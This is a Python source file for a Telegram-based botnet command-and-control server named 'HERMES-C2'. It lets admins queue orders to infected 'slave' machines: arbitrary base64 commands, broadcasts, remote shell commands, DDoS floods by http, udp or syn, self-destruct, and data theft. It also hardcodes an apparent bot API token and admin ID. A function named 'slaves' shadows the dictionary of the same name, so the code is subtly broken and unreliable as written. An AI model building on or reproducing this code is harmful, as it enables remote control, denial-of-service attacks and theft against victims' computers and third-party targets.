import os, sys, json, base64, asyncio, logging, time, random, string, socket
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters

API_TOKEN = "8419273901:AAEaaMP978nhICmtKIpb6ymZ-nz86FPPxqk"
ADMINS    = {7497594902}   # Telegram user IDs

slaves = {}      # uid -> {"ip":..,"first":..,"last":..,"queue":[]}

logging.basicConfig(level=logging.ERROR, format="%(asctime)s | %(message)s")

def rand_id(k=8): return ''.join(random.choices(string.ascii_letters+string.digits, k=k))
def is_admin(uid): return uid in ADMINS

# ---------- bot commands ----------
async def start(update: Update, _):
    await update.message.reply_text("HERMES-C2 online. /help")

async def help_cmd(update: Update, _):
    m = """
/slaves               – list slaves
/cmd <uid> <b64>      – send base64 command
/bcast <b64>          – broadcast
/kill <uid>           – self-destruct
/ddos <uid> <m> <t> <p> <s>  – method http/udp/syn
/shell <uid> <cmd>    – drop into shell
/steal <uid>          – request data steal
"""
    await update.message.reply_text(m)

async def slaves(update: Update, _):
    if not is_admin(update.effective_user.id): return
    if not slaves:
        await update.message.reply_text("No slaves.")
        return
    lines = [f"{k}  {v['ip']}  {v['plat']}  {len(v['queue'])}" for k,v in slaves.items()]
    await update.message.reply_text("Slaves:\n"+"\n".join(lines))

async def cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid, b64p = ctx.args[0], ctx.args[1]
        slaves[uid]["queue"].append(base64.b64decode(b64p).decode())
        await update.message.reply_text("Queued.")
    except:
        await update.message.reply_text("Usage: /cmd <uid> <b64>")

async def bcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        cmd = base64.b64decode(ctx.args[0]).decode()
        for uid in slaves: slaves[uid]["queue"].append(cmd)
        await update.message.reply_text("Broadcast sent.")
    except:
        await update.message.reply_text("Usage: /bcast <b64>")

async def kill(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid = ctx.args[0]
        slaves[uid]["queue"].append("KILL")
        await update.message.reply_text("Kill order sent.")
    except:
        await update.message.reply_text("Usage: /kill <uid>")

async def ddos(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid, method, target, port, secs = ctx.args
        cmd = f"DDOS {method} {target} {port} {secs}"
        slaves[uid]["queue"].append(cmd)
        await update.message.reply_text("DDoS queued.")
    except:
        await update.message.reply_text("Usage: /ddos <uid> http|udp|syn <target> <port> <seconds>")

async def shell(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid, cmdline = ctx.args[0], " ".join(ctx.args[1:])
        slaves[uid]["queue"].append(f"SHELL {cmdline}")
        await update.message.reply_text("Shell command queued.")
    except:
        await update.message.reply_text("Usage: /shell <uid> <command>")

async def steal(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    try:
        uid = ctx.args[0]
        slaves[uid]["queue"].append("STEAL")
        await update.message.reply_text("Steal order queued.")
    except:
        await update.message.reply_text("Usage: /steal <uid>")

# ---------- heartbeat ----------
async def heartbeat(update: Update, _):
    try:
        data = json.loads(base64.b64decode(update.message.text.split()[1]))
        uid = data["uid"]
        if uid not in slaves:
            slaves[uid] = {"ip":data["ip"],"plat":data["plat"],"first":time.time(),"queue":[]}
        slaves[uid]["last"] = time.time()
        if slaves[uid]["queue"]:
            payload = base64.b64encode(json.dumps(slaves[uid]["queue"]).encode()).decode()
            slaves[uid]["queue"].clear()
            await update.message.reply_text(payload)
    except:
        pass

# ---------- main ----------
def main():
    app = Application.builder().token(API_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("slaves", slaves))
    app.add_handler(CommandHandler("cmd", cmd))
    app.add_handler(CommandHandler("bcast", bcast))
    app.add_handler(CommandHandler("kill", kill))
    app.add_handler(CommandHandler("ddos", ddos))
    app.add_handler(CommandHandler("shell", shell))
    app.add_handler(CommandHandler("steal", steal))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, heartbeat))
    app.run_polling()

if __name__ == "__main__":
    main()